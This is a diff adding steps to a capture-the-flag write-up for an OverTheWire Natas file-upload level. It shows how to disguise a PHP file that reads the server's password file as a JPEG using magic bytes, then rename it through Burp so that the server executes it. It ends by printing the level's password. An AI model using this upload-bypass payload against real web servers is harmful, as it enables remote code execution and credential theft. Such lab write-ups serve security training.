@@ -98,8 +98,43 @@ In order to bypass this control we need to alter the signature bytes of our php 
 The first few bytes of a file are used as signature to identify or verify content of a file, these bytes are also called Magica Bytes.  
 [Here a list from Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures).  
 
-We are going to need jpeg's Magic Bytes: FF D8 FF E0 00 10 4A 46 49 46 00 01
+We are going to need the Magic Bytes of jpg/jpeg files: FF D8 FF E0 00 10 4A 46 49 46 00 01
 
-Create a simple php 
+First of all, open up Notepad++ (on Windows) and write a simple php code, like the following:
+```php
+aaaaaaaaaaaa<?php echo file_get_contents("/etc/natas_webpass/natas14");?>
+```
+Now, select all text and use Notepad++ built-in plugin and convert to hex, you'll get something like this:
+```
+6161616161616161616161613C3F7068
+70206563686F2066696C655F6765745F
+636F6E74656E747328222F6574632F6E
+617461735F776562706173732F6E6174
+6173313422293B3F3E
+```
+Remove the first 12 bytes, '61' (hex representation for 'a') and insert the 12 Magic Bytes above:
+```
+FFD8FFE000104A46494600013C3F7068
+70206563686F2066696C655F6765745F
+636F6E74656E747328222F6574632F6E
+617461735F776562706173732F6E6174
+6173313422293B3F3E
+```
+Select all and convert back to ASCII.  
+You'll end up having something like the string in the picture below, save the file a .php.
+
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/8d5a3e5b-3a9a-4812-819e-efc2ca214a5a" width=400 height=auto>
+
+Now, upload the file while having BurpProxy interception set to on.  
+While in transit, change the filename extension from .jpg to .php (as in the previous level) and forward the request. 
+Note that the first characters of the uploaded files are "ÿØÿàJFIF" which identifies the file as a jpg/jpeg image.  
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/290c2166-7279-41e2-b019-a7f6889458ef" width=450 height=auto>  
+
+The file is successfully uploaded. Now we only need to request it to have the remote server executing it.  
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/6580de75-d113-4e9e-ba8d-f7fd78634ec9" width=900 height=auto>
+
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/c8bd4346-604d-4540-b3ae-dbe3ae7af2a7" width=700 height=auto>
+
+The password is: **qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP**
 
 
